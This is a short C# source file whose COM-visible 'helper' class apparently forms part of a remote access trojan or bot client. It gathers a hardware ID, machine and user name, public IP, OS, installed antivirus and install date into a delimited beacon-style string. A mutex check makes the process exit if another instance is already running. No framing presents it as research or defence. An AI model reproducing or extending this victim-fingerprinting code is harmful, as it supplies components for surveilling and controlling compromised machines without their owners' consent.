using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Reflection;
using Microsoft.VisualBasic.Devices;

namespace helper
{
    [ComVisible(true)]
   public class MainCode
    {
        public string getFullInfo(string hwid,string path,string OS,string AV)
        {
            string id = Environment.MachineName + " / " + Environment.UserName;
            string ip = getip();
            string os = OS;
            string av = AV;
            string ID = InstallDate(path);
            string dn = "true";
            return hwid +"--"+ id + "--" + ip + "--" + os + "--" + av + "--" + ID + "--" + dn;   
        }
        public string UNIX()
        {
            Int32 r = (Int32)((DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0, 0)).TotalSeconds);
            return r.ToString();
        }
        public  string getip()
        {
            
            return new WebClient().DownloadString("http://checkip.dyndns.org/").Split(':')[1].Replace("</body></html>","").Replace(" ","");
        }
      
      
        public  string InstallDate(string path)
        {
            return File.GetCreationTime(path).ToString("d/MM/yyyy");
        }

        public Mutex _m;

        public void IsSingleInstance(string strMutex)
        {
            bool results = false;
            try
            {
                Mutex.OpenExisting(strMutex);
            }
            catch
            {
                _m = new Mutex(true, strMutex);
                results = true;
            }
            if (!(results))
            {
                Environment.Exit(0);
            }
        }

    }
}
